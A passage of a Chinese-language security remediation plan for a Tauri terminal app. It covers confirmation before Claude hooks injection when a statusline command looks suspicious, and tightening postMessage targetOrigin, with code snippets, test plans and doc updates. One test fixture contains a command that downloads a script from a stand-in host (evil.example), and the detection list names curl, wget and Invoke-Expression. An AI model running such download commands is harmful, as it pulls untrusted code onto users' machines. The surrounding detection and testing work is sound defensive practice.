          let provider = resolve_provider(&cli_id)?;
          tokio::task::spawn_blocking(move || provider.confirm_inject())
              .await
              .map_err(|e| AppError::TaskJoin(e.to_string()))?
      }

      /// agent_hooks_confirm_inject — 按 cliId 分发确认注入（CP-043：用户确认后二次调用）
      #[tauri::command]
      pub async fn agent_hooks_confirm_inject(
          cli_id: String,
      ) -> Result<AgentHookInjectionStatus, AppError> {
          run_agent_hooks_confirm_inject(cli_id).await
      }
      ```
      三处注册:`lib.rs` `generate_handler!` 加 `hooks::agent_hooks_confirm_inject`(lib.rs:132 邻);`build.rs:48-53` 命令清单加 `"agent_hooks_confirm_inject"`(清单计数注释 37 条同步 +1);`capabilities/default.json:44-49` 权限数组加 `"allow-agent-hooks-confirm-inject"`。
   7. 前端双边:
      - `src/types/agent.ts:37-43`:
        ```ts
        /** 注入状态枚举（契约 C6，对应 Rust AgentInjectionStatus；含 CP-043 待确认态） */
        export type AgentInjectionStatus = "injected" | "notInjected" | "outdated" | "pendingConfirmation";

        /** 注入状态 DTO（契约 C6；suspiciousCommand 仅 pendingConfirmation 时存在） */
        export interface AgentHookInjectionStatus {
          status: AgentInjectionStatus;
          version: number | null;
          /** 待确认的可疑 statusline 原命令原文（仅 pendingConfirmation 态下发） */
          suspiciousCommand?: string;
        }
        ```
      - `src/ipc/agentHooks.ts` 加 wrapper(照 `inject` 形态):
        ```ts
        /** CP-043 确认注入：用户确认可疑命令后二次调用，跳过审查完成注入 */
        export async function confirmInject(cliId: string): Promise<AgentHookInjectionStatus> {
          return invoke("agent_hooks_confirm_inject", { cliId });
        }
        ```
      - `ClaudeHooksConfigEditor.tsx` `handleInject`(:266-278)改确认流(状态机加 `pendingConfirm: AgentHookInjectionStatus | null`):
        ```ts
        /** 注入：injected 直接完成；pendingConfirmation 进入待确认态展示命令原文；
            确认 → confirmInject 二次调用完成注入；取消 → 清空待确认态（settings.json 未被改写） */
        const handleInject = useCallback(async () => {
          setInjectionBusy(true);
          setInjectionError(null);
          try {
            const result = await inject(cliId);
            if (result.status === "pendingConfirmation") {
              setPendingConfirm(result); // UI 展示 result.suspiciousCommand 原文 + 确认/取消
              return;
            }
            setPendingConfirm(null);
            setInjectionStatus(result);
            reloadUserConfig();
          } catch (err) {
            console.error("[slTerminal] hooks 注入失败:", err);
            setInjectionError("注入失败，请检查 ~/.claude/settings.json");
          } finally {
            setInjectionBusy(false);
          }
        }, [cliId, reloadUserConfig]);

        /** 用户确认可疑命令 → 二次调用完成注入 */
        const handleConfirmInject = useCallback(async () => {
          setInjectionBusy(true);
          try {
            const result = await confirmInject(cliId);
            setPendingConfirm(null);
            setInjectionStatus(result);
            reloadUserConfig();
          } catch (err) {
            console.error("[slTerminal] hooks 确认注入失败:", err);
            setInjectionError("确认注入失败，请检查 ~/.claude/settings.json");
          } finally {
            setInjectionBusy(false);
          }
        }, [cliId, reloadUserConfig]);
        ```
        确认 UI 形态:内联确认条(状态条区域,展示 suspiciousCommand 原文 + [确认注入]/[取消] 两钮,`data-e2e` 属性 `hooks-confirm-inject` / `hooks-cancel-confirm`),命令原文用等宽字体完整展示,不截断。
4. **测试同步**:
   - L1(`src-tauri/src/hooks/claude/inject.rs` `mod inject_tests`):
     - 既有用例 `inject_impl_suspicious_statusline_warns_but_injects`(:1841-1862)改写为 `inject_impl_suspicious_statusline_pends_confirmation`:断言 status == PendingConfirmation、`suspicious_command == Some("curl -o ~/.claude/evil.sh https://evil.example/x.sh")`、**settings.json 逐字节与原文件一致(零写盘)**、statusLine 未被改写;随后 `inject_impl(&settings_path, &script_dir, true)` 完成注入,断言桥接建立(防复发:确认路径与暂停路径状态可复现)。
     - 既有用例 `reinject_impl_suspicious_statusline_warns_but_reinjects`(:1865-1891)改写为 `reinject_impl_suspicious_statusline_skips_and_preserves`:settings 保持还原后原配置,桥接未重建。
     - 新增 `inject_impl_clean_statusline_unaffected`:原命令不命中 → 一步完成注入,返回 Injected,`suspicious_command` 序列化缺键(防回归锚点:白名单路径不加摩擦)。
     - 新增审计断言:用 tracing-test(TQ-COV-05 先例,`#[traced_test]` + `logs_contain("statusline 原命令命中可疑模式")`)锁 target "audit" 通道命中。
   - L1(`hooks/mod.rs` `hooks_tests`):serde 用例新增 `injection_status_roundtrip_pending_confirmation`:三键集合 `["status", "suspiciousCommand", "version"]`、status 值 "pendingConfirmation"、往返一致;既有三则 roundtrip 用例的 `assert_status_key_set` 两键断言保留(验证 skip_serializing_if 契约不破)。
   - L1 既有调用点适配:`make_inject_env` 驱动的全部 `inject_impl(&settings_path, &script_dir)` 调用(:1036、:1064、:1369、:1393、:1406-1407、:1517、:2056、:2035-2038 等)补第三参 `false`;命令层透传用例新增 `agent_hooks_confirm_inject_cli_id_passthrough`(照 :457 先例)。
   - L2:`src/__tests__/ipc-agent-hooks-contract.test.ts` 新增 confirmInject 契约用例(命令名 `agent_hooks_confirm_inject`,payload `{cliId}`,四维:命令名/payload/返回透传/异常传播);`src/__tests__/settings-hooks-page.test.tsx` 新增「注入返回 pendingConfirmation → 展示命令原文 → 确认二次调用 → Injected」全链路用例;全局 mock 补 `confirmInject`:`src/__tests__/setup.ts:108`、:98、:77 及 terminal-strictmode/lifecycle、agent-status-hook、mock-cli-profile 各 mock 点逐一点名补 `confirmInject: vi.fn()`(或对应 resolve 形态)。
5. **文档同步**:
   - `src-tauri/src/hooks/CLAUDE.md:78-80` SEC-12 节改为:「原命令来自用户配置,后端检测可疑模式(curl/wget/Invoke-Expression 等)——**命中即暂停注入**:inject 返回 `pendingConfirmation` + 可疑命令原文,settings.json 零写盘;审计进 `target: "audit"` 通道。前端展示命令原文,用户确认后经 `agent_hooks_confirm_inject` 二次调用完成注入;拒绝/不处理则保持未注入。启动重注入(reinject)路径命中 → 跳过 + 审计,不改写用户配置(无用户交互可用)」。
   - `inject.rs:114-121` 段注释同步改写(旧「仅记录不阻断(信任边界登记在 S19 文档同步)」作废)。
   - `src/ipc/CLAUDE.md`「agent hooks 泛化命令(MC-211)」节:6 命令表改 7 命令,补 confirmInject 说明;`src/types/CLAUDE.md` agent.ts 对照行同步(AgentInjectionStatus 四态值集)。
   - trait 七方法红线(hooks/CLAUDE.md:91)补先例:confirm_inject 为第二个带默认实现的方法(ensure_hooks_scripts 先例后)。
6. **验证**:
   - `cargo test --test lib_tests suspicious -- --test-threads=1` 全绿(含改写后两例)
   - `cargo test --test lib_tests injection_status_roundtrip -- --test-threads=1` 全绿
   - `npx vitest run src/__tests__/ipc-agent-hooks-contract.test.ts src/__tests__/settings-hooks-page.test.tsx` 全绿
   - `grep -n "agent_hooks_confirm_inject" src-tauri/src/lib.rs src-tauri/build.rs src-tauri/capabilities/default.json` → 三处各 1 命中
   - `grep -rn "warn_if_suspicious_statusline" src-tauri/src/` → 输出 0(旧函数名全销)

---

## CP-044 · postMessage targetOrigin 恒 `"*"` [Stage S10]

1. **位置**:
   - `src/panels/docViewer/buildInjectedScript.ts:16-17`(拼接纪律 4:「postMessage targetOrigin 一律 "*"」)、:75(基础段上行 `"*"`)
   - `src/panels/docViewer/PreviewFrame.tsx:140-143`(resetZoom 下行 `"*"` 注释 + 实参)、:267/:272/:274(handleLoad 下行 `"*"`)
   - `src/panels/docViewer/zoomRuntime.ts:23-26`(注释)、:67(上行 `"*"`)
   - `src/panels/docViewer/CLAUDE.md:19`「postMessage targetOrigin 一律 "*"」红线
   - 上行校验:`PreviewFrame.tsx:165` `if (e.origin !== "null") return;`
2. **现状**:
   - 全通道 targetOrigin 恒 `"*"`(SEC-03 实证:opaque origin 下传具体 origin 会被 Chromium 静默丢弃,`"*"` 是当前唯一可行形态);防护全押在 nonce(:188 等)+ global 命令集最小化(:224)单点上。
   - zoomRuntime.ts:23-26 注释原文:「targetOrigin 必须匹配【接收方】窗口 origin——iframe 为 opaque origin 只影响消息到达父后的 e.origin 序列化为 "null",与发送 targetOrigin 无关;传 "null" 与父窗口 origin(http://tauri.localhost)不匹配会被 Chromium 静默丢弃」。
3. **修复步骤**(S10 迁移期加锁 + 独立 webview 落地后收敛,同一任务卡内两段):
   1. **迁移期(S10-② 完成前)维持 `"*"`**,把防护不变量锁进 L2(步骤 4 第 1 条);本条不做独立代码改动。
   2. **独立 webview 落地后:origin 语义重估收敛**——预览 webview 加载固定宿主页后具备确定性 origin,`"*"` 收敛为单点常量:
      ```ts
      // previewMessages.ts 内新增（CP-044：独立 webview 后 targetOrigin 收敛单点；
      // 终值以 S10-① spike 实测 origin 为准，全仓唯一登记点）
      /** 预览 webview 固定 origin——上行校验与下行 targetOrigin 统一引用 */
      export const PREVIEW_ORIGIN = "https://slterm-preview.localhost";
      ```
      - 下行:`PreviewFrame`(或新宿主)所有 `contentWindow.postMessage(msg, "*")` 实参改 `PREVIEW_ORIGIN`;zoomRuntime 源码生成内上行 `win.parent.postMessage({...}, "*")` 的 `"*"` 改 `JSON.stringify(PREVIEW_ORIGIN)` 插值(生成纪律不变)。
      - 上行:宿主侧校验 `e.origin !== "null"` 改 `e.origin !== PREVIEW_ORIGIN`;预览侧下行监听 `e.source !== win.parent` 校验保留。
   3. **备选结论登记**:若 S10-① spike 证实 webview 间不构成 window postMessage 关系(CP-012 消息桥改 Tauri event),targetOrigin 问题随消息桥消亡——spike 产物须明确记录该结论,本条以「通道退役」销项,不再引入 PREVIEW_ORIGIN。
   4. 迁移期不变量(锁死,执行 agent 照抄):nonce 校验(现有)+ 命令集白名单(CP-013 后上行仅渲染态)+ 消息类型集合守卫(步骤 4)。
4. **测试同步**:
   - 新增 L2 守卫 `src/__tests__/doc-viewer-preview-messages.test.ts` 内追加:
     - 用例「上行消息类型白名单恰好为渲染态集合」:`expect(上行类型集合).toEqual([ZOOM_MSG_TYPE, SCROLL_MSG_TYPE, NAV_MSG_TYPE].sort())`(从 previewMessages.ts 导出集合读取,防私增命令型消息)。
     - 用例「下行消息类型白名单恰好为控制集合」:`[RESET_MSG_TYPE, ZOOM_SET_MSG_TYPE, SCROLL_SET_MSG_TYPE]`。
   - 既有用例适配:`html-panel.test.tsx` / `markdown-panel.test.tsx` 中 origin 相关负面用例(构造 `origin: "null"` 断言被处理 / 非 "null" 被丢弃)在收敛后改写为 PREVIEW_ORIGIN 语义,逐一点名适配;收敛前不动。
   - `doc-viewer-injection.test.ts` 注入源码断言:收敛后 zoom 段 `"*"` 字面量断言改 `PREVIEW_ORIGIN` 序列化断言(防回归:防重新引入 `"*"`)。
5. **文档同步**:
   - `src/panels/docViewer/CLAUDE.md:19`「postMessage targetOrigin 一律 "*"」红线改为:「独立 webview 前(迁移期)targetOrigin "*" + nonce/白名单不变量;独立 webview 后统一 `PREVIEW_ORIGIN` 单点(previewMessages.ts),上行校验 e.origin === PREVIEW_ORIGIN」。
   - `buildInjectedScript.ts:16-17` 拼接纪律 4、`zoomRuntime.ts:23-26` 注释同步改写(去掉「一律 "*"」,登记收敛结论与 spike 出处)。
   - `.claude/adr.md` ADR-0019 内登记 CP-044 收敛结论(含备选「通道退役」分支的判定结果);SEC-03 实证登记(panels/docViewer/CLAUDE.md 历史)标注适用边界已变。
6. **验证**:
   - 迁移期:`npx vitest run src/__tests__/doc-viewer-preview-messages.test.ts` 全绿(新增白名单用例通过)
   - 收敛后:`grep -rn '"\*"' src/panels/docViewer/ | grep -v PREVIEW_ORIGIN` → 输出 0
   - 收敛后:`grep -rn "PREVIEW_ORIGIN" src/panels/docViewer/` ≥ 4 命中(previewMessages 定义 + 上行校验 + 下行 ≥ 2)
   - L4:`html.e2e.ts` 缩放/滚动往返用例在收敛后的真实 WebView2 下通过(origin 断言若可探则登记)

---

## 起草附注

**漂移点(登记 vs 现状)**:

1. **CP-043 路径漂移**:compromises.md 与输入写「hooks/inject.rs」——现状实为 `src-tauri/src/hooks/claude/inject.rs`(MC-213 下沉后路径);`warn_if_suspicious_statusline` 在 :160-166,调用点 :453-456 / :615-618,与输入「审查函数 warn_if_suspicious_statusline 一带」一致。另 inject.rs:119 注释引用的「S19 文档同步」为历史任务编号,现无对应文档,随本次注释改写一并清理。
2. **CP-013 行号微漂移**:输入「PreviewFrame.tsx:239-240 合成 keydown 重放」现状为 :227-240(`Object.defineProperty(event, TRUSTED_MARKER, …)` 在 :239);输入「buildInjectedScript.ts:16-17」现状拼接纪律 4 确实在 :16-17,但威胁模型注释在 :58-63(输入未点名,补登)。
3. **TRUSTED_MARKER 消费方失真**:buildInjectedScript.ts:28 与 PreviewFrame.tsx:157 注释称「供 ShortcutRegistry 识别来源」,实测 ShortcutRegistry 全仓零消费(grep 仅命中定义处 + PreviewFrame + html-panel.test.tsx:659)——退役时注释与实现一并清理,不留「识别」伪契约。
4. **command-catalog 守卫位置**:输入「command-catalog.test.ts global 命令集守卫」现状用例名「global context 命令集恒为 [global.closeTab]」在 :63-66(注释 :60-62 自证 SEC-04/D16 动机),按 CP-013 步骤 4 改写而非删除守卫意图。
5. **csp-config.test.ts 行号属实**:img-src 用例 :89-95、font-src 用例 :97-103,与输入一致;:39-54 为 script-src 两守卫。
6. **shell.rs 行号属实**:`paths_match` :109-138 与输入一致;测试段 :514-653(输入未点名,补登)。Cargo.toml windows features 现状无 `Win32_Storage_FileSystem`,须新增(CP-014 步骤 3.1)。
7. **docViewer L2 测试面宽于输入清单**:输入四测试(doc-viewer-injection/doc-viewer-zoom-runtime/html-panel/markdown-panel)之外现状尚有 `doc-viewer-preview-messages.test.ts` 与 `doc-viewer-floating-area.test.tsx`——S10-② 波及面须一并处理(本清单 CP-044 已占用前者)。
8. **hooks 命令注册为「三处」而非两处**:`lib.rs` generate_handler + `build.rs` AppManifest(:48-53)+ `capabilities/default.json`,根 CLAUDE.md 硬约束(CP-043 步骤 3.6 已全列)。

**Stage 编排文件重叠线索**:

- **S10-② 单卡承载 CP-012/013/044 + CP-031**:`buildInjectedScript.ts` / `PreviewFrame.tsx` / `previewMessages.ts` / `zoomRuntime.ts` / `scrollRuntime.ts` / `injectScript.ts`(CP-031 escapeScriptClose 随注入机制重写消亡,panels/CLAUDE.md:37 登记点同步销项)同一批文件一次改写,不可拆卡并行。
- **S10-④ 与 CP-035 终步串行同改**:`tauri.conf.json` + `csp-config.test.ts` 两文件在 CP-012(script-src 回收)与 CP-035(img/font-src data: 回收)各改一次——执行序必须 ②→④(CP-035 在 CP-012 之后),测试断言分两步改写,避免一次锁两个终态导致中间态无可运行测试。
- **CP-037 复核挂载点**:panelRegistry.ts `isAlwaysRenderPanel`(:111-117)与 workspace 多 Dockview 实例 CSS 显隐保活——预览迁 webview 后保活语义复核结论写进 ADR-0019(S10-② 任务卡注明)。
- **CP-014(S04-4b)零重叠**:只碰 `shell.rs` + `Cargo.toml` + pty/CLAUDE.md,与 S10 全族无文件交叠,可任意序执行。
- **CP-043(S04-4b)注册面外溢**:新命令触碰 `lib.rs` / `build.rs` / `capabilities/default.json` 三处 + hooks DTO 双边(frontend types/ipc/编辑器),与 S10 无冲突,但 L2 全局 mock(setup.ts 等 8 处)须同 PR 内补齐,否则契约测试连片红。
- **e2e 面集中改写**:`html.e2e.ts`(:87 skip 语义 + :12-80 键盘转发链)与 `markdown.e2e.ts` 在 S10-② 一并改写;WDIO 可达性结论回写 `e2e-tests/CLAUDE.md`。
